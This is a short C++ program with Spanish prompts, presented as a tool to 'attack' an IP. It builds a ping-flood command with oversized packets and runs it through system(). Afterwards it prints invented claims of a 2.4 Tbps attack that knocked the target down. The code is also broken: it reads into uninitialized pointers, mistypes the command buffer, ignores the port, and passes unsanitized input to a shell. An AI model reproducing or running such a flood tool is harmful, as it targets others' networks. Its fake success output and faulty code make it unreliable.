#include <iostream>

int main()
{
  char *lol;
  char *xd;
  char *command[200] = {0};
  std::cout << "Introducir la IP para atacar: ";
  std::cin >> lol;
  std::cout << "\nIntroducir el puerto para atacar: ";
  std::cin >> xd;
  #ifdef __linux__
    snprintf(command, 200, "ping %s -c 99999 -q -s 65500", lol);
  #else
    snprintf(command, 200, "ping %s -t -l 65500 > nul", lol);
  #endif
  std::cout << "Atacando la IP: 127.0.0.1\nPuerto: 7777\nPotencia:2.4tbps\nStatus: Tumbada\nIP bajada por sls422 y braian samp samp....";
  system(command);
  return 0;
}
